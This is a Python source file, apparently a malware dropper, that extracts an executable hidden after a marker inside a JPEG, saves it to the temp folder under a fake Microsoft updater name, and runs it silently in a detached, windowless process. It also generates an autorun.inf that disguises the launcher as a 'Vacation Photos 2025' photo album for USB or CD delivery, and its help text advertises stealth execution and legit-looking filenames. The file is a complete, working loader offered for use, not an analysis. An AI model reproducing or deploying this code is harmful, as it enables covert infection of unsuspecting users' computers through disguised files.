"""
Payload Extractor - Rasm ichidan EXE ni chiqarish va ishga tushirish
Usage: python extract_payload.py image_with_payload.jpg
"""

import sys
import os
import subprocess
import ctypes

def is_admin():
    """Admin huquqlari bormi"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def extract_and_run(image_file, silent=True):
    """Extract EXE from image and run"""
    
    if not silent:
        print(f"🔓 Extracting payload from {image_file}...")
    
    try:
        # Read image file
        with open(image_file, 'rb') as f:
            data = f.read()
        
        # Find separator
        separator = b'\xFF\xD9\xFF\xD8PAYLOAD_START'
        
        if separator not in data:
            if not silent:
                print("❌ No payload found!")
            return False
        
        # Split at separator
        parts = data.split(separator)
        exe_data = parts[1] if len(parts) > 1 else None
        
        if not exe_data:
            if not silent:
                print("❌ Invalid payload!")
            return False
        
        # Temp directory
        temp_dir = os.getenv('TEMP')
        
        # Legit-looking filenames
        legit_names = [
            'MicrosoftEdgeUpdate.exe',
            'OneDriveStandaloneUpdater.exe',
            'WindowsUpdateAssistant.exe',
            'GoogleUpdateSetup.exe',
        ]
        
        temp_exe = os.path.join(temp_dir, legit_names[0])
        
        # Write EXE
        with open(temp_exe, 'wb') as f:
            f.write(exe_data)
        
        if not silent:
            print(f"✅ Extracted: {len(exe_data):,} bytes")
            print(f"🚀 Running...")
        
        # Run silently - NO WINDOW
        if os.name == 'nt':  # Windows
            # CREATE_NO_WINDOW = 0x08000000
            # DETACHED_PROCESS = 0x00000008
            subprocess.Popen(
                [temp_exe],
                creationflags=0x08000000,  # No window
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL,
                close_fds=True
            )
        else:
            subprocess.Popen(
                [temp_exe],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL
            )
        
        if not silent:
            print("✅ Payload running in background!")
        
        # Self-destruct (optional)
        # os.remove(image_file)
        
        return True
        
    except Exception as e:
        if not silent:
            print(f"❌ Error: {e}")
        return False

def create_autorun():
    """Create autorun script for USB/CD"""
    
    autorun_inf = """[autorun]
open=extract_payload.exe image.jpg
action=Open Photo Album
icon=image.jpg,0
label=Vacation Photos 2025
"""
    
    with open('autorun.inf', 'w') as f:
        f.write(autorun_inf)
    
    print("✅ autorun.inf created (for USB/CD autorun)")

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("=" * 60)
        print("🖼️  PAYLOAD EXTRACTOR")
        print("=" * 60)
        print("\nUsage: python extract_payload.py <image_file>")
        print("\nExample:")
        print("  python extract_payload.py vacation_photo.jpg")
        print("\nFeatures:")
        print("  ✅ Extract EXE from steganography image")
        print("  ✅ Run silently (no console window)")
        print("  ✅ Legit filenames (MicrosoftEdgeUpdate.exe)")
        print("  ✅ Background execution")
        sys.exit(1)
    
    image_file = sys.argv[1]
    
    if not os.path.exists(image_file):
        print(f"❌ File not found: {image_file}")
        sys.exit(1)
    
    # Extract and run
    success = extract_and_run(image_file, silent=False)
    
    if success:
        print("\n✅ Done! Agent is running in background.")
    else:
        print("\n❌ Failed to extract/run payload")
        sys.exit(1)
